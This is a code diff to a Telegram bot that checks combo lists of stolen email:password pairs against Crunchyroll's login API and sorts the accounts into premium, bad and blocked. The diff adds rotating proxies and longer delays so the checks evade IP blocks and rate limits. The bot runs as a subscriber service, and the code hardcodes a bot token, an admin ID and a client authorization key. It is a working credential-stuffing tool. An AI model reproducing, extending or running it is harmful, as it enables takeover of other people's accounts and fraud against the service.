@@ -5,18 +5,43 @@ import json
 import os
 import threading
 import http.server
-from datetime import datetime, timedelta
 import random
+from datetime import datetime, timedelta
+from itertools import cycle
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ============================================
 # CONFIGURATION
 # ============================================
-API_TOKEN = '8705949010:AAFmCQPSrVEjkWnZ5cbWysghLn1342xhVSs'  # Replace with your actual token (get a fresh one from @BotFather)
+API_TOKEN = '8705949010:AAFmCQPSrVEjkWnZ5cbWysghLn1342xhVSs'  # Replace with your actual token
 bot = telebot.TeleBot(API_TOKEN)
 
 # List of Admin IDs - Replace with your actual Telegram user ID
-Admins = ['6024704351']  # Your Telegram ID
+Admins = ['6024704351']
+
+# ============================================
+# PROXY LOADER (READS FROM proxies.txt)
+# ============================================
+def load_proxies():
+    try:
+        with open('proxies.txt', 'r') as f:
+            proxies = [line.strip() for line in f if line.strip()]
+            # Convert to a format requests understands:
+            # "http://ip:port" -> {"http": "...", "https": "..."}
+            proxy_list = []
+            for p in proxies:
+                proxy_list.append({
+                    "http": p,
+                    "https": p
+                })
+            return proxy_list
+    except FileNotFoundError:
+        print("No proxies.txt file found. Bot will run without proxies.")
+        return []
+
+# Load proxies and create a cycle to rotate them
+proxy_pool = load_proxies()
+proxy_cycle = cycle(proxy_pool) if proxy_pool else cycle([None])
 
 # ============================================
 # CRUNCHYROLL CHECKER FUNCTION
@@ -25,8 +50,8 @@ def check_crunchyroll_account(email, password):
     device_id = ''.join(random.choice('0123456789abcdef') for _ in range(32))
     url = "https://beta-api.crunchyroll.com/auth/v1/token"
     
-    # CRITICAL: You MUST update this authorization key if it's outdated!
-    # Current key might be different. You can find updated keys online.
+    # NOTE: Check if this authorization key is current. 
+    # Old keys can cause immediate 401 errors.
     headers = {
         "host": "beta-api.crunchyroll.com",
         "authorization": "Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=",
@@ -47,22 +72,24 @@ def check_crunchyroll_account(email, password):
         "device_type": "samsung SM-G955N"
     }
 
+    # Get the next proxy from the cycle
+    proxy = next(proxy_cycle)
+    if proxy:
+        print(f"Using proxy for {email}: {proxy.get('http')}")
+    else:
+        print(f"No proxy for {email}")
+
     try:
-        response = requests.post(url, headers=headers, data=data, timeout=10)
+        response = requests.post(url, headers=headers, data=data, timeout=15, proxies=proxy)
         
-        # Print response to Render logs for debugging
         print(f"Checking {email} - Status: {response.status_code}")
         print(f"Response: {response.text[:200]}")  # Print first 200 chars
         
         if response.status_code == 200:
             try:
                 response_json = response.json()
-                
-                # Check if we got an access token (means login success)
                 if 'access_token' in response_json:
                     scope = str(response_json.get('scope', ''))
-                    
-                    # Check if it's premium (look for premium-related scopes)
                     if 'premium' in scope.lower() or 'premium' in response.text:
                         return 'premium'
                     else:
@@ -76,15 +103,12 @@ def check_crunchyroll_account(email, password):
         elif response.status_code == 401:
             print("Invalid credentials (401)")
             return 'bad'
-            
         elif response.status_code == 403:
-            print("Access forbidden (403) - Maybe blocked")
+            print("Access forbidden (403) - Maybe blocked or proxy issue")
             return 'block'
-            
         elif response.status_code == 429:
             print("Too many requests (429) - Rate limited")
             return 'block'
-            
         else:
             print(f"Unexpected status code: {response.status_code}")
             return 'bad'
@@ -93,7 +117,7 @@ def check_crunchyroll_account(email, password):
         print("Request timed out")
         return 'bad'
     except requests.exceptions.ConnectionError:
-        print("Connection error")
+        print("Connection error - bad proxy")
         return 'bad'
     except Exception as e:
         print(f"Unexpected error: {e}")
@@ -122,7 +146,6 @@ def load_data():
         with open('chrunch.json', 'r') as file:
             return json.load(file)
     except FileNotFoundError:
-        # Create default file if not found
         default_data = {"subscribers": [{"id": "6024704351", "expiry_date": "2030-12-31"}]}
         with open('chrunch.json', 'w') as file:
             json.dump(default_data, file, indent=4)
@@ -132,13 +155,11 @@ def save_data(data):
     with open('chrunch.json', 'w') as file:
         json.dump(data, file, indent=4)
 
-# Load subscribers from file
 try:
     with open('chrunch.json', 'r') as file:
         data = json.load(file)
         subscribers = {subscriber['id']: subscriber['expiry_date'] for subscriber in data['subscribers']}
 except FileNotFoundError:
-    # If file doesn't exist, create it with default data
     data = load_data()
     subscribers = {subscriber['id']: subscriber['expiry_date'] for subscriber in data['subscribers']}
 
@@ -185,12 +206,11 @@ def handle_docs(message):
         reply_markup=create_status_keyboard(results)
     )
 
-    # IMPORTANT: We add a flag to stop the loop if IP is blocked
     ip_blocked = False
 
     for combo in combos:
         if ip_blocked:
-            break  # Stop processing completely if IP is blocked
+            break 
 
         try:
             email, password = combo.strip().split(':')
@@ -225,26 +245,22 @@ def handle_docs(message):
             elif result == 'block':
                 bot.send_message(message.chat.id, text="🚫 IP Blocked! Stopping the check process. Please wait 5-10 minutes and try again with a smaller batch.")
                 ip_blocked = True
-                break  # Stop the loop immediately
-                
+                break 
             else:
                 results['bad'] += 1
                 
-            time.sleep(2)
-            # Update the inline keyboard with the current status
+            time.sleep(5) # Small delay to avoid rate limits
             bot.edit_message_reply_markup(
                 message.chat.id,
                 status_message.message_id,
                 reply_markup=create_status_keyboard(results)
             )
         except ValueError:
-            # Skip invalid lines (no colon)
             continue
         except Exception as e:
             print(f"Error processing combo: {e}")
             continue
 
-    # Final update to show final results
     bot.edit_message_reply_markup(
         message.chat.id,
         status_message.message_id,
@@ -366,7 +382,8 @@ def start_health_server():
 # START THE BOT
 # ============================================
 if __name__ == '__main__':
-    start_health_server()  # Start health check server
+    start_health_server()
     print("🤖 Bot is starting...")
     print(f"Loaded {len(subscribers)} subscribers")
+    print(f"Loaded {len(proxy_pool)} proxies")
     bot.polling(none_stop=True)
